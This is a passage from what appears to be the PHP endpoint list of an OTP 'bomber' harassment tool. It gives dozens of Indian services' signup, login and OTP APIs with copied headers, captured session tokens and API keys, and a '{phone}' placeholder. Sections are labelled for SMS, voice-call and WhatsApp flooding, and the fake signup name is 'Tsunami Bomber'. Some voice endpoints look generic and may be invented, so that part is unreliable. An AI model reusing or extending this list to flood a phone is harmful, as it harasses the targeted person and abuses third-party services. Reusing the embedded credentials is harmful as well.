                    "x-hs-usertoken: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJhdWQiOiJ1bV9hY2Nlc3MiLCJleHAiOjE2MDE1NjE4NTksImlhdCI6MTYwMDk1NzA1OSwiaXNzIjoiVFMiLCJzdWIiOiJ7XCJoSWRcIjpcIjAzN2EwZmUzNjgzMDRlYzc5OGMzYTE0ODA5MzZhMTEyXCIsXCJwSWRcIjpcImQzZmU0ZDAyMzYxODRhNGFiYmE0M2Q0MDY2Y2RhYjBkXCIsXCJuYW1lXCI6XCJHdWVzdCBVc2VyXCIsXCJpcFwiOlwiMjQwOTo0MDYzOjRlMmI6N2FmZjo6NDc0OToyYTBjXCIsXCJjb3VudHJ5Q29kZVwiOlwiaW5cIixcImN1c3RvbWVyVHlwZVwiOlwibnVcIixcInR5cGVcIjpcImd1ZXN0XCIsXCJpc0VtYWlsVmVyaWZpZWRcIjpmYWxzZSxcImlzUGhvbmVWZXJpZmllZFwiOmZhbHNlLFwiZGV2aWNlSWRcIjpcImZhYTg4ZjA1LTc0MzItNDEwMy05ODg2LTdiZDkzNGY1YzNhMVwiLFwicHJvZmlsZVwiOlwiQURVTFRcIixcInZlcnNpb25cIjpcInYyXCIsXCJzdWJzY3JpcHRpb25zXCI6e1wiaW5cIjp7fX0sXCJpc3N1ZWRBdFwiOjE2MDA5NTcwNTkwOTh9IiwidmVyc2lvbiI6IjFfMCJ9.UJP1xZvNR_mGEN4ZVswMkkb1VZhHJL60XtObL48Izcc",
                    "content-type: application/json",
                    "x-hs-platform: PCTV",
                    "x-country-code: IN",
                    "x-hs-device-id: faa88f05-7432-4103-9886-7bd934f5c3a1",
                    "hotstarauth: st=1600957099~exp=1600963099~acl=/um/v3/*~hmac=dc2680f8d081c49647a2cfe43d4f67b015729c23514d944d46281373208e951d",
                    "x-hs-appversion: 5.0.40",
                    "x-request-id: faa88f05-7432-4103-9886-7bd934f5c3a1",
                    "accept: */*",
                    "origin: https://www.hotstar.com",
                    "referer: https://www.hotstar.com/in/subscribe/sign-in",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"phone_number":"{phone}","country_prefix":"91"}'
            ],
            [
                "name" => "AltBalaji",
                "method" => "POST",
                "url" => "https://api.cloud.altbalaji.com/accounts/mobile/verify?domain=IN",
                "headers" => [
                    "Host: api.cloud.altbalaji.com",
                    "Accept: application/json, text/plain, */*",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "X-API-KEY: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6Ik1TalA5OXV4OGhLazFrS1UifQ.eyJwaG9uZV9udW1iZXIiOiI5NTE5ODc0NzA0IiwiY291bnRyeV9jb2RlIjoiOTEiLCJwbGF0Zm9ybSI6IndlYiIsImV4cCI6MTYwMTA0MzI4OTEyN30.oNzgLsMqF8n9jroKUG9F3cXR90Wm1OyJLvVuG-XaklE",
                    "Content-Type: application/json",
                    "Origin: https://www.altbalaji.com",
                    "Referer: https://www.altbalaji.com/user-detail?pid=NTU%3D",
                    "Accept-Language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"phone_number":"{phone}","country_code":"91","platform":"web","exp":1601043289127}'
            ],
            [
                "name" => "Voot",
                "method" => "POST",
                "url" => "https://us-central1-vootdev.cloudfunctions.net/usersV3/v3/checkUser",
                "headers" => [
                    "Host: us-central1-vootdev.cloudfunctions.net",
                    "Accept: application/json, text/plain, */*",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json;charset=UTF-8",
                    "origin: https://www.voot.com",
                    "referer: https://www.voot.com/",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"type":"mobile","mobile":"{phone}","countryCode":"+91"}'
            ],
            [
                "name" => "SonyLIV",
                "method" => "POST",
                "url" => "https://apiv2.sonyliv.com/AGL/1.6/A/ENG/WEB/IN/CREATEOTP",
                "headers" => [
                    "Host: apiv2.sonyliv.com",
                    "device_id: 5836d9e1f6cb4f029bb44161b37c4fa0-1600956156120",
                    "security_token: eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJpYXQiOjE2MDA5NTYxMDgsImV4cCI6MTYwMjI1MjEwOCwiYXVkIjoiKi5zb255bGl2LmNvbSIsImlzcyI6IlNvbnlMSVYiLCJzdWIiOiJzb21lQHNldGluZGlhLmNvbSJ9.I8vEXYZ4J6shgQzIOLWTq8ig7WALBfj42Bng0hPG8DKJjM5iEKrUL3uhK0KrUdR_K-_ZygrGjaLzMxsP4-n3iR7Tiof_uSjNZ9-LntnHGDB1yTASX4ix4luUOew547IpjalclVbpR0-eJ3HTaFaSkM06L0ahK9Xj5GUxfxGLODv0ROYLMR26v0BF6z23pl1M-_C9voY_HJ6R_aZ4jItQjeJre11NxHcPnf8rU16QDIn6Oxxw5fHCaVpFRIWfs_3BdTz2fONzIO7o0n-sJk8w_TnFQy--8QQ6ZWIL1snd1v-2jvh4L59zjy5TVZJopmWnUUUxWRtiTQzGvx-ifqjUEaZBujHS8Ll1g5bp5oiWYfUEJskP3kPa7iopY19B6Xp_ondgsbW34tpX6uyZ5ZcW58E9wVyNwNmhcanWySxoPjI_Ng0dhXD5H03Z9yfbe6RnZcealVYBmD6ogTdh4V6Q41IyZcPOQelKNJT0XCwzExpZUQ4Ly7VTZIk8j4PFuJvmgFA6CvnYIjf0rAZR9cnLBq7quU4W9n07ngSsBuVG7KRGxV9qB98goaGrgepx0EJH-kAIWsfyWEdORLCLo-FykORLUXPFOEULd2rINn5i_mspSkyg6_UUHUWV8nMqhyjP4zVLeIMXyNusDLSMHvW5PmpBVDSNl-oWkr4dITLE_cc",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "session_id: cc86326a51504133bacd3ce4f796e1cf-1600956156256",
                    "x-via-device: true",
                    "app_version: 3.1.20",
                    "origin: https://www.sonyliv.com",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"channelPartnerID":"MSMIND","mobileNumber":"{phone}","country":"IN","timestamp":"2020-09-24T14:03:03.505Z"}'
            ],
            [
                "name" => "Flipkart",
                "method" => "POST",
                "url" => "https://1.rome.api.flipkart.com/1/action/view",
                "headers" => [
                    "Host: 1.rome.api.flipkart.com",
                    "x-user-agent: Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909) AppleWebKit/537.36",
                    "Origin: https://www.flipkart.com",
                    "User-Agent: Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "Accept: */*",
                    "Referer: https://www.flipkart.com/login?ret=/",
                    "Accept-Language: en-US"
                ],
                "data" => '{"actionRequestContext":{"type":"LOGIN_IDENTITY_VERIFY","loginIdPrefix":"+91","loginId":"{phone}","clientQueryParamMap":{"ret":"/","entryPage":"HOMEPAGE_HEADER_ACCOUNT"},"loginType":"MOBILE","verificationType":"OTP","screenName":"LOGIN_V4_MOBILE","sourceContext":"DEFAULT"}}'
            ],
            [
                "name" => "Netmeds",
                "method" => "GET",
                "url" => "https://m.netmeds.com/mst/rest/v1/id/details/{phone}",
                "headers" => [
                    "Host: m.netmeds.com",
                    "Accept: application/json, text/plain, */*",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "referer: https://m.netmeds.com/customer/account/login",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => null
            ],
            [
                "name" => "Apollo247",
                "method" => "POST",
                "url" => "https://webapi.apollo247.com/",
                "headers" => [
                    "Host: webapi.apollo247.com",
                    "Accept: */*",
                    "Authorization: Bearer 3d1833da7020e0602165529446587434",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "Origin: https://www.apollo247.com",
                    "Accept-Language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"operationName":"Login","variables":{"mobileNumber":"+91{phone}","loginType":"PATIENT"},"query":"query Login($mobileNumber: String!, $loginType: LOGIN_TYPE!) { login(mobileNumber: $mobileNumber, loginType: $loginType) {status message loginId __typename } }"}'
            ],
            [
                "name" => "Swiggy",
                "method" => "POST",
                "url" => "https://www.swiggy.com/mapi/auth/signup",
                "headers" => [
                    "Host: www.swiggy.com",
                    "origin: https://www.swiggy.com",
                    "__fetch_req__: true",
                    "user-agent: Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "accept: */*",
                    "referer: https://www.swiggy.com/auth/register",
                    "accept-encoding: gzip, deflate",
                    "accept-language: en-US"
                ],
                "data" => '{"name":"Tsunami Bomber","email":"tsunami@gmail.com","password":"sndndndbdj283jsbsbs","referral_code":"","mobile":"{phone}","_csrf":"jK7JY3E9u8xJ-1Q_DUwsGnPDhccbB4rGz0dKIbfk"}'
            ],
            [
                "name" => "Zomato",
                "method" => "POST",
                "url" => "https://www.zomato.com/webroutes/auth/login",
                "headers" => [
                    "Host: www.zomato.com",
                    "x-zomato-csrft: a6b0c09972b2bdd30c9c1b6552caee5d",
                    "save-data: on",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "accept: */*",
                    "origin: https://www.zomato.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.zomato.com/kanpur",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"country_id":1,"phone":"{phone}","verification_type":"sms","method":"phone"}'
            ],
            [
                "name" => "Dream11",
                "method" => "POST",
                "url" => "https://www.dream11.com/graphql/mutation/pwa/register",
                "headers" => [
                    "Host: www.dream11.com",
                    "accept: */*",
                    "device: pwa",
                    "x-csrf: fb1f1947-4547-392d-9a28-a9de30d9e766",
                    "save-data: on",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "origin: https://www.dream11.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.dream11.com/register?ru=",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"query":"mutation register( $email: String! $mobileNumber: String! $password: String! $site: String) { registerSendOTPMutation( email: $email mobileNumber: $mobileNumber password: $password site: $site ) { message }}","variables":{"email":"tsunami@gmail.com","mobileNumber":"{phone}","password":"tsunami@123astronomia"}}'
            ],
            [
                "name" => "Byjus",
                "method" => "POST",
                "url" => "https://bcas-prod.byjusweb.com/api/send-otp",
                "headers" => [
                    "Host: bcas-prod.byjusweb.com",
                    "accept: */*",
                    "origin: https://byjus.com",
                    "user-agent: Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909) AppleWebKit/537.36",
                    "content-type: application/x-www-form-urlencoded",
                    "referer: https://byjus.com/byjus-classes-book-a-free-demo-class/registration/",
                    "accept-encoding: gzip, deflate",
                    "accept-language: en-US"
                ],
                "data" => "phoneNumber={phone}&page=free-trial-classes"
            ],
            [
                "name" => "Unacademy",
                "method" => "POST",
                "url" => "https://unacademy.com/api/v3/user/user_check/",
                "headers" => [
                    "Host: unacademy.com",
                    "accept: */*",
                    "authorization: Bearer undefined",
                    "save-data: on",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "origin: https://unacademy.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://unacademy.com/login",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"phone":"{phone}","country_code":"IN","otp_type":1,"email":"","send_otp":true,"is_un_teach_user":false}'
            ],
            [
                "name" => "Vedantu",
                "method" => "POST",
                "url" => "https://user.vedantu.com/user/preLoginVerification",
                "headers" => [
                    "Host: user.vedantu.com",
                    "save-data: on",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "accept: */*",
                    "origin: https://www.vedantu.com",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.vedantu.com/masterclass",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"email":null,"phoneCode":"+91","phoneNumber":"{phone}","ver":"11.345"}'
            ],
            [
                "name" => "Paytm",
                "method" => "POST",
                "url" => "https://accounts.paytm.com/v2/api/register",
                "headers" => [
                    "Host: accounts.paytm.com",
                    "Accept: application/json, text/plain, */*",
                    "Origin: https://accounts.paytm.com",
                    "User-Agent: Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909) AppleWebKit/537.36",
                    "Content-Type: application/json",
                    "Referer: https://accounts.paytm.com/oauth2/authorize?theme=mp-html5&redirect_uri=https%3A%2F%2Fpaytm.com%2Fv1%2Fapi%2Fauthresponse&is_verification_excluded=false&client_id=paytm-web-secure&type=web_server&scope=paytm&response_type=code",
                    "Accept-Encoding: gzip, deflate",
                    "Accept-Language: en-US"
                ],
                "data" => '{"email":"","mobile":"{phone}","loginPassword":"Pura@1090","csrfToken":"f7ea628c-91a2-5f14-82ca-6f7eee295b1d","redirectUri":"https://paytm.com/v1/api/authresponse","clientId":"paytm-web-secure","scope":"paytm","state":"","responseType":"code","theme":"mp-html5","dob_agreement":true}'
            ],
            [
                "name" => "Ola",
                "method" => "POST",
                "url" => "https://accounts.olacabs.com/api/login",
                "headers" => [
                    "Host: accounts.olacabs.com",
                    "x-fingerprint-id: 3664542227",
                    "csrf-token: v3z6FhSz-2Bc4HBdVkPPXegy_3coRLVxGv4I",
                    "x-requested-with: XMLHttpRequest",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "accept: */*",
                    "origin: https://accounts.olacabs.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://accounts.olacabs.com/?serviceType=p2p&when=NOW",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"mobileNumber":"{phone}","dialingCode":"+91","countryCode":"IN","headers":{},"verificationId":null,"captchaInfo":{"gcaptcha":"03AGdBq26mRWBEeBGcFIqhyewjUTfv-Cl4msB5OR3-1NN-IS9kKj3JDAR6MxB0rvNMfhCRqxJccxbUSndGyJvojv2ohDgNe2q8683oSNoD624E20bLqeo6ViMHsgogMvgSmKQUlummiZfr3MUM39UW0T8yJkG1OAEO9-HWTK-wZkEG7bgpxoGFrh1Cw4WwIGPnVZ4-pmulwlAbDCqsgqahK9ngTb8S-EPZu7tFR1srJDE8nF4WhHUR8qsLR1ijem1sNsrdi2-_IihHp3GZqisH1Izt-dmuGW-zSYWyHmZ5EtNcZEk4iA0rxlPpru-n0fxN8RjAH7z4dJJ3vhish9hcyhYYSriKYmiFZzrwO1T72BQrXyx8Xk_zf6YnHwzZms-NEdojlOt87D-t45Fm31IXnTBcTM1-TXZmKCoia6k1kGZmk1arWUMNuSq0SNMh6g42XZ59_I14q_qhM9qF7lMNaSbYOaRQnjlLkA","fingerPrint":3664542227,"storageId":"16038843100270vLePjUljyT3B4eOO8Qvp0VNZ5l"}}'
            ],
            [
                "name" => "BookMyShow",
                "method" => "POST",
                "url" => "https://in.bookmyshow.com/pwa/api/uapi/otp/send",
                "headers" => [
                    "Host: in.bookmyshow.com",
                    "accept: application/json",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "origin: https://in.bookmyshow.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://in.bookmyshow.com/login/otp?referer=/my-profile&phoneNumber={phone}&email=&source=web",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"channel":"phone","subChannel":"sms","details":{"phone":"{phone}","origin":"https://in.bookmyshow.com"}}'
            ],
            [
                "name" => "BigBasket",
                "method" => "POST",
                "url" => "https://www.bigbasket.com/mapi/v4.0.0/member-svc/otp/send/",
                "headers" => [
                    "Host: www.bigbasket.com",
                    "accept: application/json",
                    "x-csrftoken: gHbsx6okji95qhYgKApxE9vPjHhYlpBkgVd73fh23WRxl9XfmikiznVB1Jy2X2ED",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "x-channel: BB-PWA",
                    "content-type: application/json",
                    "origin: https://www.bigbasket.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.bigbasket.com/auth/login/",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"identifier":"{phone}"}'
            ],
            [
                "name" => "RedBus",
                "method" => "GET",
                "url" => "https://m.redbus.in/api/getOtp?number={phone}&cc=91&whatsAppOpted=undefined",
                "headers" => [
                    "Host: m.redbus.in",
                    "accept: application/json, text/plain, */*",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://m.redbus.in/preregister",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => null
            ],
            [
                "name" => "MakeMyTrip",
                "method" => "POST",
                "url" => "https://mapi.makemytrip.com/ext/web/pwa/isUserRegistered?region=in&language=eng&currency=inr",
                "headers" => [
                    "Host: mapi.makemytrip.com",
                    "deviceid: a3d2f892-af4d-40d1-808a-db6286b8fe1f",
                    "currency: inr",
                    "language: eng",
                    "authorization: h4nhc9jcgpAGIjp",
                    "visitor-id: a3d2f892-af4d-40d1-808a-db6286b8fe1f",
                    "region: in",
                    "accept: application/json",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "origin: https://www.makemytrip.com",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.makemytrip.com/",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"loginId":"{phone}","type":"MOBILE","version":2,"countryCode":"91"}'
            ],
            [
                "name" => "Oyo",
                "method" => "POST",
                "url" => "https://www.oyorooms.com/api/pwa/generateotp?locale=en",
                "headers" => [
                    "Host: www.oyorooms.com",
                    "xsrf-token: vsnr5ksR-bduQ9oz3foaxbqjfoLSnVIzFzY0",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: text/plain;charset=UTF-8",
                    "accept: */*",
                    "origin: https://www.oyorooms.com",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.oyorooms.com/login",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"phone":"{phone}","country_code":"+91","nod":4}'
            ],
            [
                "name" => "Dominos",
                "method" => "POST",
                "url" => "https://api.dominos.co.in/loginhandler/forgotpassword",
                "headers" => [
                    "Host: api.dominos.co.in",
                    "api_key: d2aeb489bb8df385",
                    "secretkey: dqsqauugzIzgyNZW6iPkjIHlzFIiPvXo8S+CIytp",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "origin: https://m.dominos.co.in",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://m.dominos.co.in/",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"lastName":"","mobile":"{phone}","firstName":""}'
            ],
            [
                "name" => "PizzaHut",
                "method" => "POST",
                "url" => "https://api.pizzahut.io/v1/otp/generate",
                "headers" => [
                    "Host: api.pizzahut.io",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json; charset=utf-8",
                    "accept: /",
                    "origin: https://www.pizzahut.co.in",
                    "sec-fetch-site: cross-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"phone":"+91{phone}"}'
            ],
            [
                "name" => "KFC",
                "method" => "POST",
                "url" => "https://online.kfc.co.in/OTP/ResendOTPToPhoneForLogin",
                "headers" => [
                    "Host: online.kfc.co.in",
                    "accept: application/json, text/plain, /",
                    "__requestverificationtoken: x4nkEUgK8ry30gyy-VfQiKwfxseHkYTZKSPIpJHHlL-XhI5qidMgytvqfMZQsnrTBUVN3nwjxfkI70h7NsrayLrZYPH3voJRiGqlvga3w4U1:gCgZsKH5NNJvB6KvrR3oFpE5mADmB1LbVgWsjUpzeWB9ciFioAJphnNwbb4J_wlGLz1-gFLxPsXqOC6EdFC0aUgBW3Yw6JgX0E4zxTsvHK81",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json;charset=UTF-8",
                    "origin: https://online.kfc.co.in",
                    "sec-fetch-site: same-origin",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://online.kfc.co.in/login",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"phoneNumber":"{phone}","AuthorizedFor":"3","Resend":"false"}'
            ],
            [
                "name" => "BurgerKing",
                "method" => "POST",
                "url" => "https://consumer-apis.burgerking.in/api/v1/user/signUp",
                "headers" => [
                    "Host: consumer-apis.burgerking.in",
                    "appversion: 1.6",
                    "authorization: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJpZGVudGl0eSI6IlRFTVA2OTIyMjg1MjcxNjA0NTYxMTc2IiwiZXhwIjoxNjA0NTYxMjM2fQ.GU9L_HlIAZEQqfxi2nK0o2VGW8Y1L1JS8giVDn85F70",
                    "content-type: application/json",
                    "accept: application/json, text/plain, */",
                    "timestamp: 1604561218463",
                    "userid: TEMP6922285271604561176",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "platform: web",
                    "type: dinein",
                    "encryptionkey: 39c9c62a58dc93a3787b7dc7727b289b7583b678d44fc2c17e2887150a11db38",
                    "origin: https://www.burgerking.in",
                    "sec-fetch-site: same-site",
                    "sec-fetch-mode: cors",
                    "sec-fetch-dest: empty",
                    "referer: https://www.burgerking.in/",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => '{"phone_no":"{phone}"}'
            ],
            [
                "name" => "Lenskart",
                "method" => "POST",
                "url" => "https://api.lenskart.com/v2/customers/sendOtp",
                "headers" => [
                    "Host: api.lenskart.com",
                    "origin: https://www.lenskart.com",
                    "x-b3-traceid: 991600776345288",
                    "user-agent: Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json;charset=UTF-8",
                    "accept: application/json, text/plain, */*",
                    "cache-control: no-cache, no-store",
                    "x-session-token: 3bcac6f3-bda5-4370-8dc1-eebd8274b399",
                    "x-api-client: mobilesite",
                    "referer: https://www.lenskart.com/customer/account/login",
                    "accept-encoding: gzip, deflate",
                    "accept-language: en-US"
                ],
                "data" => '{"telephone":"{phone}"}'
            ],
            [
                "name" => "Nykaa",
                "method" => "POST",
                "url" => "https://www.nykaa.com/app-api/index.php/customer/send_otp",
                "headers" => [
                    "Host: www.nykaa.com",
                    "content-type: application/x-www-form-urlencoded",
                    "user-agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36",
                    "accept: */*",
                    "origin: https://www.nykaa.com",
                    "referer: https://www.nykaa.com/",
                    "accept-encoding: gzip, deflate, br",
                    "accept-language: en-US,en;q=0.9,hi;q=0.8"
                ],
                "data" => "source=sms&app_version=3.0.9&mobile_number={phone}&platform=ANDROID&domain=nykaa"
            ],
            [
                "name" => "Ajio",
                "method" => "POST",
                "url" => "https://login.web.ajio.com/api/auth/signupSendOTP",
                "headers" => [
                    "Host: login.web.ajio.com",
                    "accept: application/json",
                    "Origin: https://www.ajio.com",
                    "User-Agent: Mozilla/5.0 (Linux; U; Android 8.1.0; en-us; CPH1909) AppleWebKit/537.36",
                    "content-type: application/json",
                    "Referer: https://www.ajio.com/signup?referrer=/my-account/",
                    "Accept-Encoding: gzip, deflate",
                    "Accept-Language: en-US"
                ],
                "data" => '{"firstName":"Tsunami Bomber","login":"tsunami@gmail.com","password":"kd34646@3131nxnxn","genderType":"","mobileNumber":"{phone}","requestType":"SENDOTP"}'
            ],
            // VOICE/CALL BOMBER APIS
            [
                "name" => "Tata Capital Voice",
                "method" => "POST",
                "url" => "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}","isOtpViaCallAtLogin":"true"}'
            ],
            [
                "name" => "1MG Voice",
                "method" => "POST",
                "url" => "https://www.1mg.com/auth_api/v6/create_token",
                "headers" => [
                    "Content-Type: application/json; charset=utf-8",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"number":"{phone}","otp_on_call":true}'
            ],
            [
                "name" => "Swiggy Voice",
                "method" => "POST",
                "url" => "https://profile.swiggy.com/api/v3/app/request_call_verification",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobile":"{phone}"}'
            ],
            [
                "name" => "Flipkart Voice",
                "method" => "POST",
                "url" => "https://www.flipkart.com/api/6/user/voice-otp/generate",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"mobile":"{phone}"}'
            ],
            [
                "name" => "Amazon Voice",
                "method" => "POST",
                "url" => "https://www.amazon.in/ap/signin",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => "phone={phone}&action=voice_otp"
            ],
            [
                "name" => "Paytm Voice",
                "method" => "POST",
                "url" => "https://accounts.paytm.com/signin/voice-otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}"}'
            ],
            [
                "name" => "Zomato Voice",
                "method" => "POST",
                "url" => "https://www.zomato.com/php/o2_api_handler.php",
                "headers" => [
                    "Content-Type: application/x-www-form-urlencoded",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => "phone={phone}&type=voice"
            ],
            [
                "name" => "MakeMyTrip Voice",
                "method" => "POST",
                "url" => "https://www.makemytrip.com/api/4/voice-otp/generate",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}"}'
            ],
            [
                "name" => "Ola Voice",
                "method" => "POST",
                "url" => "https://api.olacabs.com/v1/voice-otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"{phone}"}'
            ],
            [
                "name" => "Uber Voice",
                "method" => "POST",
                "url" => "https://auth.uber.com/v2/voice-otp",
                "headers" => [
                    "Content-Type: application/json",
                    "User-Agent: Mozilla/5.0 (Linux; Android 8.1.0; CPH1909) AppleWebKit/537.36"
                ],
                "data" => '{"phone":"+91{phone}"}'
            ],
            // WHATSAPP BOMBER APIS
            [
                "name" => "KPN WhatsApp",
                "method" => "POST",
                "url" => "https://api.kpnfresh.com/s/authn/api/v1/otp-generate?channel=AND&version=3.2.6",
                "headers" => [
                    "x-app-id: 66ef3594-1e51-4e15-87c5-05fc8208a20f",
                    "content-type: application/json; charset=UTF-8",
                    "user-agent: okhttp/5.0.0-alpha.11"
                ],
                "data" => '{"notification_channel":"WHATSAPP","phone_number":{"country_code":"+91","number":"{phone}"}}'
            ],
